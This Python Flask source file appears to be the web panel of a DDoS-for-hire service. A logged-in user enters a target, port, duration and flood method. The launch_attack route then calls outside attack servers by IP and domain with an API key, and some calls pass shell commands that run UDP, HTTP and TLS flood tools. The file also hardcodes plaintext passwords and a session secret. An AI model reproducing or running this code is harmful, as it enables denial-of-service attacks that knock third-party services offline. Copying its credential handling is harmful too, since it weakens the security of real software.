import os
from flask import Flask, render_template, request, redirect, url_for, session, flash
import requests
import time
import random

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

app = Flask(
    __name__,
    template_folder=os.path.join(BASE_DIR, "templates"),
    static_folder=os.path.join(BASE_DIR, "static")
)
app.secret_key = 'Eralp13092012'

users = {
    'eralp': {
        'password': 'Eralp13092012',
        'online': True
    },
    'kiril': {
        'password': 'asybdhf854',
        'online': False
    }
}

user_counts = []
timestamps = []

def update_user_data():
    global user_counts, timestamps
    user_count = len(users)
    user_counts.append(user_count)
    timestamps.append(time.strftime("%H:%M:%S"))

    if len(user_counts) > 5:
        user_counts.pop(0)
        timestamps.pop(0)
        
def add_user():
    users[f'testuser{random.randint(0, 1000)}'] = 'testpass' 
    update_user_data()


def reset_users():
    global users
    users = {
    'eralp': 'Eralp13092012',
    'eral22p': 'Eralp13092012',
    'era34343lp': 'Eralp13092012',

    'kiril': 'asybdhf854'
    }
    user_counts.clear()
    timestamps.clear()
    update_user_data()
    
@app.route('/')
def index2():
    if 'username' in session:

        update_user_data()

        online_users = sum(
            1 for user in users.values()
            if user.get('online')
        )

        offline_users = len(users) - online_users

        return render_template(
            'base.html',
            username=session['username'],
            online_users=online_users,
            offline_users=offline_users,
            user_counts=user_counts,
            timestamps=timestamps
        )

    return redirect(url_for('login'))
@app.route('/add_user', methods=['GET'])
def add_user_route():
    add_user()
    return redirect(url_for('index2'))
    
@app.route('/reset_users', methods=['GET'])
def reset_users_route():
    reset_users()
    return redirect(url_for('index2'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if username in users and users[username] == password:
            session['username'] = username
            return redirect(url_for('index'))
        else:
            flash('Неверный логин или токен!')
    return render_template('login.html')


@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))


@app.route('/attack')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('attack.html')


@app.route('/methods')
def index3():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('methods.html')


@app.route('/launch_attack', methods=['POST'])
def launch_attack():
    if 'username' not in session:
        return redirect(url_for('login'))

    target = request.form['target']
    port = request.form['port']
    duration = request.form['duration']
    method = request.form['method']

    print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration} секунд, Метод: {method}")
    if method == "UDPFLOOD":
        url = f"http://217.144.185.177:5000/attack?type=L4&ip={target}&port={port}&method={method}&time={duration}&key=kriskaUSDEGR454T"
        requests.get(url)
    if method == "UDPRAND":
        url = f"http://217.144.185.177:5000/shell?command=./udp {target} {port} 1000 1000 {duration}&key=kriskaUSDEGR454T"
        requests.get(url)
    elif method == "HTTPS-JYNX":
        url = f"http://217.144.185.177:5000/shell?command=./HTTPS-JYNX {target} {duration} 50&key=kriskaUSDEGR454T"
        requests.get(url)
    elif method == "HTTPFLOOD":
        url = f"http://gadalubau.zone.id:11121/kudel?host={target}&port={port}&time={duration}&methods=H2"
        requests.get(url)
    elif method == "TLS":
        url = f"http://217.144.185.177:5000/shell?command=node TLS.js {target} {duration} 1 http2.txt&key=kriskaUSDEGR454T"
        requests.get(url)
    return redirect(url_for('index'))

if __name__ == "__main__":
    app.run(debug=True)
